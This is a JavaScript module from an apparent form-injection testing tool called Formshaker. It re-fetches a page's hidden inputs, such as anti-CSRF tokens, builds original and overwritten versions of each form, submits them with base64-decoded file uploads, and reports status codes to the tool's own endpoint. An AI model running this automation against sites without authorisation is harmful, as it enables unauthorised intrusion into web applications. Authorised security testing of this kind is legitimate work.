
    // ------------------------------- [+] pivot-utils.ajax.js [+] --------------------

    /**
    * Function that fetches new hidden inputs of a form
    * @param    {List} payloads    A list of forms to be injected
    */
    // no async or await to keep compatibility backwards
    function fetchFreshHiddenInputs_and_UpdateValues_and_InjectForms(payload) {

        if (payload) {

            xhr = new XMLHttpRequest();
            xhr.timeout = 4000;
            xhr.open('GET', payload.origin);
            xhr.setRequestHeader("XX-Origin", "Formshaker-fetch-fresh-hidden-inputs");
            xhr.ontimeout = function () {
                console.log('Origin: Failed from timeout ' + payload.origin);
            };
            xhr.onreadystatechange = function () {
                if (xhr.readyState == XMLHttpRequest.DONE) {
                    var contentType = xhr.getResponseHeader("Content-Type");
                    
                    if (contentType) {
                        var status = xhr.status;
                        if (status === 0 || (status >= 200 && status < 400)) {
                            if (payload.origin == xhr.responseURL) {
                                data = xhr.responseText;
                                // Obtain the hidden type inputs 
                                hidden_inputs = getHiddenInputsByForm(data, payload.formNumberInPage)
                                var hidden_inputs_size = Object.keys(hidden_inputs).length;

                                if (hidden_inputs_size > 0) {
                                    updated_payload = updateFormHiddenInputs(payload, hidden_inputs)
                                }
                                if (debug)
                                    console.log("[*] updateHiddenTypeInputs_technique and CreateTwoPayloadsFromOne_and_InjectThem")
                                CreateTwoPayloadsFromOne_and_InjectThem(payload)

                            }
                        }
                    }
                }
            }
            xhr.send();
        }
    }


    /**
    * Function that injects the payloads/forms via AJAX request
    * @param    {String} payload    the form to be injected
    */
    function injectForm(payload, attempt) {

        var data = "";
        console.log(payload.action)
        if (payload.enctype == "multipart/form-data") {
            var form_data = new FormData();
            for (index in payload.inputs) {
                value = decodeURIComponent(payload.inputs[index].value)
                if (payload.inputs[index].Type == "file") {
                    if (value) {
                        uint8Array = Uint8Array.from(atob(value), c => c.charCodeAt(0))
                        if (payload.inputs[index].contentType && payload.inputs[index].fileName) {
                            contentType = payload.inputs[index].contentType
                            fileName = payload.inputs[index].fileName
                        } else {
                            // injectasitgoes
                            var { contentType, extension } = getFileContentTypeAndExtension(uint8Array);
                            fileName = "formshaker." + extension
                        }
                        a = new Blob([uint8Array], { type: contentType });
                        a = new File([a], fileName, { type: contentType });
                        form_data.append(payload.inputs[index].name, a);
                    } else {
                        form_data.append(payload.inputs[index].name, value);
                    }
                } else {
                    form_data.append(payload.inputs[index].name, value);
                }

            }
            data = form_data

        } else {
            for (index in payload.inputs) {
                name = payload.inputs[index].name
                value = encodeURIComponent(payload.inputs[index].value)
                data = data.concat(name + "=" + value + "&")
            }

        }

        var xhr = new XMLHttpRequest();
        xhr.open(payload.method, payload.action);
        xhr.setRequestHeader("XX-Origin", "Formshaker-injection");
        if (payload.enctype == "multipart/form-data") {
            // let it set the CT automatically
        } else {
            xhr.setRequestHeader("Content-Type", payload.enctype);
        }
        xhr.timeout = 4000;
        xhr.ontimeout = function () {
            App.notify('timeout', 'Pivoted request timeout');
        };
        xhr.onreadystatechange = function () {
            if (xhr.readyState == XMLHttpRequest.HEADERS_RECEIVED) {

                var status = xhr.status;
                App.notify('success', 'Pivoted request successfully made! - ' + status);

                formID = payload.identifier

                var xhr1 = new XMLHttpRequest();
                xhr1.open("POST", endpoint + "/" + formID + "/response");
                xhr1.setRequestHeader("XX-Origin", "Formshaker");
                xhr1.setRequestHeader("Content-Type", "application/json");
                xhr1.timeout = 4000;
                xhr1.ontimeout = function () {
                    App.notify('timeout', 'Formshaker update endpoint timeout');
                };
                xhr1.onreadystatechange = function () {
                    if (xhr1.readyState == XMLHttpRequest.HEADERS_RECEIVED) {
                        App.notify('success', 'Formshaker form updated with the http code!');
                    }
                }
                xhr1.send(JSON.stringify({ "HttpStatusCode": status, "Attempt": attempt, "executionID": executionID }));
            }
        }
        xhr.send(data);

    }

    /**
    * Function that creates two versions of forms from a payload/form
    * @param    {String} payload    the form to be injected
    */
    function CreateTwoPayloadsFromOne_and_InjectThem(payload) {

        if (settings) {
            var v1 = {};
            Object.assign(v1, payload);

            var v2 = {};
            Object.assign(v2, payload);

            var TwoPayloads = [v1, v2];
            // original values + overwritten values with settings (Standalone)
            TwoPayloads[0].inputs = craftNewForms(payload.inputs, false)
            //-----------------------------
            TwoPayloads[1].inputs = craftNewForms(payload.inputs, true)

            injectForm(TwoPayloads[0], 0)
            injectForm(TwoPayloads[1], 1)
        }
    }



    //------------------------------------------------------------------------------------------------------